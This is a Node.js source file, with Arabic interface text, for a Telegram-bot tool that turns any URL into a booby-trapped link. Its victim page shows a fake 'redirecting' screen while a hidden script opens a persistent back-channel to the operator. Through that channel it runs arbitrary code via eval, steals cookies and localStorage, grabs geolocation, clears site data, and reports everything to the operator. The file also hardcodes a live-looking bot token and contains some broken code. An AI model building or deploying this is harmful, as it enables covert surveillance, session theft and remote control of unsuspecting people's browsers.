const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const bodyParser = require('body-parser');
const { Server: SocketIO } = require('socket.io');

// 🔧 إعدادات البوت
const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
const id = '6565594143';
const SERVER_URL = process.env.SERVER_URL || 'https://your-app.vercel.app';

const app = express();
const appServer = http.createServer(app);
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true
    }
  }
});

// تخزين البيانات
const reverseSessions = new Map();
const infectedLinks = new Map();
const pendingActions = new Map();

// إعدادات middleware
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({
  limit: '50mb',
  extended: true
}));

// ========== نظام الجلسات العكسية المتقدم ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال عكسي جديد:', socket.id);

  socket.on('reverse_connect', async (data) => {
    const { device_id, link_id, platform, userAgent, url, ip, device_info } = data;
    
    console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
    
    const sessionData = {
      socket: socket,
      device_id: device_id,
      link_id: link_id,
      platform: platform,
      userAgent: userAgent,
      url: url,
      ip: ip,
      device_info: device_info,
      connected: true,
      connected_at: new Date()
    };

    // حفظ في الذاكرة
    reverseSessions.set(device_id, sessionData);

    // إرسال إشعار للتليجرام
    await appBot.sendMessage(
      id,
      `🦠 جلسة عكسية جديدة!\n\n` +
      `📱 الجهاز: <code>${device_id}</code>\n` +
      `🔗 الرابط: ${link_id}\n` +
      `💻 النظام: ${platform}\n` +
      `🌐 المتصفح: ${userAgent}\n` +
      `🔗 الصفحة: ${url}\n` +
      `📍 الأيبي: ${ip || 'مخفي'}\n\n` +
      `✅ الجلسة جاهزة للتحكم الكامل`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ التحكم في الجهاز", callback_data: `control:${device_id}` },
              { text: "📊 معلومات الجهاز", callback_data: `info:${device_id}` }
            ],
            [
              { text: "🛑 إنهاء الجلسة", callback_data: `kill:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('command_result', (data) => {
    const { device_id, command, result } = data;
    
    let displayResult = result;
    if (result && result.length > 3000) {
      displayResult = result.substring(0, 3000) + '\n\n... [تم تقصير الناتج]';
    }
    
    appBot.sendMessage(
      id,
      `📤 نتيجة الأمر من ${device_id}:\n\n` +
      `💻 الأمر: <code>${command}</code>\n` +
      `📊 الناتج:\n<pre>${displayResult || 'لا يوجد ناتج'}</pre>`,
      { 
        parse_mode: "HTML"
      }
    );
  });

  socket.on('disconnect', () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        appBot.sendMessage(
          id,
          `🔌 انتهت الجلسة العكسية\n📱 الجهاز: ${device_id}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام تلغيم الروابط ==========

// 🔗 دالة لإنشاء رابط ملغم
function createInfectedLink(originalUrl) {
    const linkId = uuidv4();
    const payloadId = uuidv4();
    
    const infectedLink = {
        linkId: linkId,
        payloadId: payloadId,
        originalUrl: originalUrl,
        createdAt: new Date(),
        url: `${SERVER_URL}/link/${payloadId}`
    };
    
    infectedLinks.set(linkId, infectedLink);
    infectedLinks.set(payloadId, infectedLink);
    
    return infectedLink;
}

// ========== واجهة البوت ==========

// 🎯 معالجة الضغط على الأزرار
appBot.on("callback_query", async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = message.chat.id;
    
    console.log('🔄 تم الضغط على زر:', data);
    
    try {
        if (data === 'infect_link') {
            await appBot.sendMessage(
                chatId,
                `🔗 أرسل لي الرابط الذي تريد تلغيمه:\n\n` +
                `مثال:\n<code>https://example.com</code>\n<code>https://google.com</code>`,
                {
                    parse_mode: "HTML",
                    reply_markup: { force_reply: true }
                }
            );
            
            pendingActions.set(chatId, { action: 'infect_link' });
        }
        else if (data.startsWith('copy:')) {
            const payloadId = data.split(':')[1];
            let link = '';
            
            if (infectedLinks.has(payloadId)) {
                link = infectedLinks.get(payloadId).url;
            }
            
            if (link) {
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: `✅ تم نسخ الرابط` 
                });
                
                await appBot.sendMessage(
                    chatId,
                    `🔗 الرابط الملغم:\n\n<code>${link}</code>`,
                    { parse_mode: "HTML" }
                );
            }
        }
        else if (data === 'sessions') {
            const activeSessions = Array.from(reverseSessions.keys());
            
            if (activeSessions.length === 0) {
                await appBot.sendMessage(chatId, '📭 لا توجد أجهزة متصلة حالياً');
            } else {
                let sessionsText = `📱 الأجهزة المتصلة: ${activeSessions.length}\n\n`;
                
                activeSessions.forEach(deviceId => {
                    const session = reverseSessions.get(deviceId);
                    const duration = Math.round((new Date() - session.connected_at) / 1000);
                    
                    sessionsText += `📱 <code>${deviceId}</code>\n` +
                                 `💻 ${session.platform}\n` +
                                 `⏰ ${duration} ثانية\n\n`;
                });
                
                await appBot.sendMessage(
                    chatId, 
                    sessionsText,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "🔄 تحديث", callback_data: "sessions" }
                                ]
                            ]
                        }
                    }
                );
            }
        }
        else if (data.startsWith('control:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `🎯 التحكم في الجهاز: <code>${device_id}</code>\n\n` +
                `اختر الأمر المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "📍 الموقع", callback_data: `location:${deviceId}` },
                                { text: "📳 الاهتزاز", callback_data: `vibrate:${deviceId}` }
                            ],
                            [
                                { text: "🔋 البطارية", callback_data: `battery:${deviceId}` },
                                { text: "🖼️ الصور", callback_data: `photos:${deviceId}` }
                            ],
                            [
                                { text: "📊 المعلومات", callback_data: `info:${deviceId}` },
                                { text: "💾 التخزين", callback_data: `storage:${deviceId}` }
                            ],
                            [
                                { text: "📸 لقطة شاشة", callback_data: `screenshot:${deviceId}` },
                                { text: "🔄 فرمتة", callback_data: `format:${deviceId}` }
                            ],
                            [
                                { text: "⚡ أمر مخصص", callback_data: `custom:${deviceId}` },
                                { text: "🔙 رجوع", callback_data: "sessions" }
                            ]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('kill:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.disconnect();
                reverseSessions.delete(deviceId);
                
                await appBot.sendMessage(chatId, `🛑 تم إنهاء الجلسة: ${deviceId}`);
            }
        }
        else if (data.startsWith('location:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الموقع'
                });
                
                await appBot.sendMessage(chatId, `📍 جاري تحديد موقع الجهاز...`);
            }
        }
        else if (data.startsWith('vibrate:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'اهتزاز'
                });
                
                await appBot.sendMessage(chatId, `📳 جاري تشغيل الاهتزاز...`);
            }
        }
        else if (data.startsWith('battery:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'البطارية'
                });
                
                await appBot.sendMessage(chatId, `🔋 جاري قراءة حالة البطارية...`);
            }
        }
        else if (data.startsWith('photos:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الصور'
                });
                
                await appBot.sendMessage(chatId, `🖼️ جاري سحب الصور...`);
            }
        }
        else if (data.startsWith('info:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'معلومات'
                });
                
                await appBot.sendMessage(chatId, `📊 جاري جمع معلومات الجهاز...`);
            }
        }
        else if (data.startsWith('storage:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'التخزين'
                });
                
                await appBot.sendMessage(chatId, `💾 جاري قراءة التخزين...`);
            }
        }
        else if (data.startsWith('screenshot:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'لقطة'
                });
                
                await appBot.sendMessage(chatId, `📸 جاري أخذ لقطة الشاشة...`);
            }
        }
        else if (data.startsWith('format:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'فرمتة'
                });
                
                await appBot.sendMessage(chatId, `🔄 جاري محاكاة الفرمتة...`);
            }
        }
        else if (data.startsWith('custom:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `⚡ أدخل الأمر المخصص للجهاز <code>${deviceId}</code>:\n\n` +
                `مثال: <code>js:alert('hello')</code>\n\n` +
                `أدخل الأمر الآن:`,
                {
                    parse_mode: "HTML",
                    reply_mply: true }
                }
            );
            
            pendingActions.set(chatId, { action: 'custom_command', deviceId: deviceId });
        }

    } catch (error) {
        console.error('❌ خطأ في المعالجة:', error);
        await appBot.answerCallbackQuery(callbackQuery.id, { 
            text: "❌ حدث خطأ أثناء المعالجة" 
        });
    }
});

// 📨 معالجة الرسائل النصية
appBot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // التحقق من صلاحية المستخدم
    if (String(chatId) !== String(id)) {
        await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
        return;
    }

    // معالجة الردود على الأوامر
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text;
        
        if (replyText.includes('أرسل لي الرابط الذي تريد تلغيمه')) {
            const url = text.trim();
            
            // التحقق من أن النص هو رابط
            if (url.startsWith('http://') || url.startsWith('https://')) {
                await appBot.sendMessage(chatId, `⏳ جاري تلغيم الرابط...`);
                
                // إنشاء رابط ملغم
                const infectedLink = createInfectedLink(url);
                
                await appBot.sendMessage(
                    chatId,
                    `🔗 رابط ملغم جاهز!\n\n` +
                    `🆔 المعرف: <code>${infectedLink.linkId}</code>\n` +
                    `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                    `🌐 الرابط الأصلي:\n<code>${url}</code>\n\n` +
                    `🔗 الرابط الملغم:\n<code>${infectedLink.url}</code>\n\n` +
                    `🚀 الميزات:\n` +
                    `• ✅ يعمل في جميع المتصفحات\n` +
                    `• 📍 تحديد الموقع الدقيق\n` +
                    `• 📳 تشغيل الاهتزاز\n` +
                    `• 🖼️ سحب الصور والملفات\n` +
                    `• 📱 معلومات الجهاز الكاملة\n\n` +
                    `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
                    `• سيفتح اتصال عكسي تلقائياً\n` +
                    `• ستظهر جلسته في "الأجهزة المتصلة"\n` +
                    `• يمكنك التحكم الكامل في جهازه\n\n` +
                    `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { 
                                        text: "🔗 نسخ الرابط", 
                                        callback_data: `copy:${infectedLink.payloadId}` 
                                    },
                                    { 
                                        text: "📱 الأجهزة المتصلة", 
                                        callback_data: "sessions" 
                                    }
                                ],
                                [
                                    { 
                                        text: "🔄 تلغيم رابط آخر", 
                                        callback_data: "infect_link" 
                                    }
                                ]
                            ]
                        }
                    }
                );
                
                pendingActions.delete(chatId);
            } else {
                await appBot.sendMessage(chatId, `❌ الرابط غير صحيح. تأكد من أن الرابط يبدأ بـ http:// أو https://`);
            }
            return;
        }
        else if (replyText.includes('أدخل الأمر المخصص')) {
            const command = text;
            
            if (pendingActions.has(chatId)) {
                const pending = pendingActions.get(chatId);
                const deviceId = pending.deviceId;
                
                if (reverseSessions.has(deviceId)) {
                    const session = reverseSessions.get(deviceId);
                    
                    session.socket.emit('command', {
                        device_id: deviceId,
                        command: command
                    });
                    
                    await appBot.sendMessage(chatId, `✅ تم إرسال الأمر للجهاز: ${command}`);
                } else {
                    await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
                }
                
                pendingActions.delete(chatId);
            }
            return;
        }
    }

    // الأوامر النصية
    if (text === '/start' || text === 'start') {
        const activeSessions = Array.from(reverseSessions.keys()).length;
        
        await appBot.sendMessage(
            chatId,
            `🎯 بوت تلغيم الروابط العكسي\n\n` +
            `📊 الإحصائيات الحالية:\n` +
            `• 📱 الأجهزة المتصلة: ${activeSessions}\n` +
            `• 🔗 الروابط الملغمة: ${infectedLinks.size}\n\n` +
            `✨ الميزات:\n` +
            `• 🎯 تحكم كامل في الأجهزة\n` +
            `• 📍 تحديد الموقع الدقيق\n` +
            `• 📳 تشغيل الاهتزاز\n` +
            `• 🖼️ سحب الصور والملفات\n` +
            `• 🔋 معلومات البطارية\n` +
            `• 🔗 تلغيم أي رابط\n\n` +
            `🔧 اختر الإجراء المطلوب:`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🔗 تلغيم رابط", callback_data: "infect_link" },
                            { text: "📱 الأجهزة المتصلة", callback_data: "sessions" }
                        ]
                    ]
                }
            }
        );
    }
});

// ========== نظام البايلود للروابط ==========

// 🌐 صفحة تشغيل البايلود للروابط
app.get('/link/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    
    if (!infectedLinks.has(payloadId)) {
        return res.status(404).send('الرابط غير موجود');
    }

    const linkData = infectedLinks.get(payloadId);
    
    const payloadCode = `
    <script>
        // === ADVANCED REVERSE PAYLOAD ===
        (function() {
            const CONFIG = {
                link_id: '${linkData.linkId}',
                payload_id: '${linkData.payloadId}',
                server_url: '${SERVER_URL}',
                original_url: '${linkData.originalUrl}'
            };

            console.log('🦠 Reverse Payload Activated');

            // بدء النظام
            function startSystem() {
                connectToServer();
                redirectToOriginal();
            }

            // الاتصال بالسيرفر
            function connectToServer() {
                try {
                    const ws = new WebSocket(CONFIG.server_url.replace('https', 'wss'));
                    
                    ws.onopen = function() {
                        sendDeviceInfo(ws);
                    };
                    
                    ws.onmessage = function(event) {
                        handleCommand(event);
                    };
                    
                    ws.onclose = function() {
                        setTimeout(connectToServer, 3000);
                    };
                    
                    ws.onerror = function() {
                        setTimeout(connectToServer, 5000);
                    };
                    
                } catch (error) {
                    setTimeout(connectToServer, 5000);
                }
            }

            // إرسال معلومات الجهاز
            function sendDeviceInfo(ws) {
                const deviceInfo = {
                    device_id: generateDeviceId(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: {
                        width: window.screen?.width,
                        height: window.screen?.height
                    },
                    url: window.location.href,
                    ip: getClientIP(),
                    timestamp: new Date().toISOString()
                };
                
                ws.send(JSON.stringify({
                    type: 'reverse_connect',
                    device_id: deviceInfo.device_id,
                    link_id: CONFIG.link_id,
                    platform: deviceInfo.platform,
                    userAgent: deviceInfo.userAgent,
                    url: deviceInfo.url,
                    ip: deviceInfo.ip,
                    device_info: deviceInfo
                }));
            }

            // معالجة الأوامر
            function handleCommand(event) {
                try {
                    const data = JSON.parse(event.data);
                    
                    if (data.type === 'command') {
                        executeCommand(data.command, data.device_id)
                            .then(result => {
                                event.target.send(JSON.stringify({
                                    type: 'command_result',
                                    device_id: data.device_id,
                                    command: data.command,
                                    result: result
                                }));
                            });
                    }
                } catch (e) {}
            }

            // تنفيذ الأوامر
            async function executeCommand(command, deviceId) {
                try {
                    let result = '';
                    const cmd = command.toLowerCase().trim();
                    
                    if (cmd === 'معلومات') {
                        result = await getSystemInfo();
                    }
                    else if (cmd === 'الموقع') {
                        result = await getLocation();
                    }
                    else if (cmd === 'اهتزاز') {
                        result = triggerVibration();
                    }
                    else if (cmd === 'البطارية') {
                        result = await getBattery();
                    }
                    else if (cmd === 'الصور') {
                        result = getImages();
                    }
                    else if (cmd === 'التخزين') {
                        result = getStorage();
                    }
                    else if (cmd === 'لقطة') {
                        result = takeScreenshot();
                    }
                    else if (cmd === 'فرمتة') {
                        result = formatDevice();
                    }
                    else if (cmd.startsWith('js:')) {
                        const jsCode = command.substring(3);
                        result = String(await eval(jsCode));
                    } else {
                        result = String(await eval(command));
                    }
                    
                    return result || '✅ تم التنفيذ';
                    
                } catch (error) {
                    return '❌ خطأ: ' + error.toString();
                }
            }

            // معلومات النظام
            async function getSystemInfo() {
                const info = {
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: window.screen ? \`\${window.screen.width}x\${window.screen.height}\` : 'Unknown',
                    cookies: document.cookie,
                    url: window.location.href,
                    timestamp: new Date().toISOString()
                };
                
                return JSON.stringify(info, null, 2);
            }

            // الموقع
            function getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve('❌ لا يدعم الموقع');
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            resolve(JSON.stringify({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy + ' متر'
                            }, null, 2));
                        },
                        error => {
                            resolve('❌ خطأ في الموقع');
                        }
                    );
                });
            }

            // الاهتزاز
            function triggerVibration() {
                if (navigator.vibrate) {
                    navigator.vibrate([200, 100, 200]);
                    return '📳 تم تشغيل الاهتزاز';
                }
                return '❌ لا يدعم الاهتزاز';
            }

            // البطارية
            function getBattery() {
                return new Promise((resolve) => {
                    if (navigator.getBattery) {
                        navigator.getBattery().then(battery => {
                            resolve(JSON.stringify({
                                level: (battery.level * 100) + '%',
                                charging: battery.charging ? 'نعم' : 'لا'
                            }, null, 2));
                        });
                    } else {
                        resolve('❌ لا يدعم البطارية');
                    }
                });
            }

            // الصور
            function getImages() {
                try {
                    const images = Array.from(document.images);
                    return \`🖼️ العدد: \${images.length}\`;
                } catch (error) {
                    return '❌ خطأ في الصور';
                }
            }

            // التخزين
            function getStorage() {
                try {
                    return JSON.stringify({
                        cookies: document.cookie,
                        localStorage: localStorage ? Object.keys(localStorage) : []
                    }, null, 2);
                } catch (error) {
                    return '❌ خطأ في التخزين';
                }
            }

            // لقطة الشاشة
            function takeScreenshot() {
                return '📸 هذه الميزة تحتاج مكتبة html2canvas';
            }

            // الفرمتة
            function formatDevice() {
                try {
                    if (localStorage) localStorage.clear();
                    document.cookie.split(";").forEach(cookie => {
                        const name = cookie.split("=")[0].trim();
                        document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
                    });
                    return '✅ تم محاكاة الفرمتة';
                } catch (error) {
                    return '❌ خطأ في الفرمتة';
                }
            }

            // إنشاء معرف الجهاز
            function generateDeviceId() {
                return 'device_' + Math.random().toString(36).substr(2, 9);
            }

            // الحصول على IP
            function getClientIP() {
                return new Promise((resolve) => {
                    fetch('https://api.ipify.org?format=json')
                        .then(response => response.json())
                        .then(data => resolve(data.ip))
                        .catch(() => resolve('مخفي'));
                });
            }

            // التوجيه للرابط الأصلي
            function redirectToOriginal() {
                setTimeout(() => {
                    window.location.href = CONFIG.original_url;
                }, 2000);
            }

            // بدء النظام
            console.log('🚀 Starting Reverse Payload...');
            setTimeout(startSystem, 500);

        })();
    </script>
    `;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>جاري التوجيه...</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                margin: 0;
                padding: 20px;
                font-family: Arial, sans-serif;
                background: #1a1a1a;
                color: white;
                text-align: center;
            }
            .container {
                max-width: 100%;
                margin: 0 auto;
            }
            .loading {
                font-size: 18px;
                margin: 20px 0;
                color: #58a6ff;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>🔗 جاري التوجيه...</h2>
            <div class="loading">انتظر قليلاً...</div>
        </div>

        ${payloadCode}
    </body>
    </html>
    `);
});

// 🌐 الصفحة الرئيسية
app.get('/', (req, res) => {
    const activeSessions = Array.from(reverseSessions.keys()).length;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Advanced Reverse Bot</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                background: #0d1117; 
                color: #c9d1d9; 
                text-align: center;
            }
            .container { 
                max-width: 800px; 
                margin: 0 auto; 
            }
            .status { 
                background: #161b22; 
                padding: 20px; 
                border-radius: 10px; 
                margin: 20px 0; 
                border: 1px solid #30363d;
            }
            h1 { color: #58a6ff; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Advanced Reverse Bot</h1>
            <p>نظام تلغيم الروابط والتحكم الكامل</p>
            
            <div class="status">
                <h2>📊 System Status</h2>
                <p>📱 الأجهزة المتصلة: ${activeSessions}</p>
                <p>🔗 الروابط الملغمة: ${infectedLinks.size}</p>
                <p>⏰ وقت التشغيل: ${Math.round(process.uptime())} ثانية</p>
                <p>🟢 الحالة: <strong>نشط ومستقر</strong></p>
            </div>
            
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
        </div>
    </body>
    </html>
    `);
});

// 🚀 بدء السيرفر
const PORT = process.env.PORT || 3000;
appServer.listen(PORT, () => {
    console.log(`✅ البوت شغال على البورت: ${PORT}`);
    console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
    console.log(`🔗 السيرفر: ${SERVER_URL}`);
    console.log(`⚡ جاهز لتلغيم الروابط!`);
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled Rejection:', error);
});
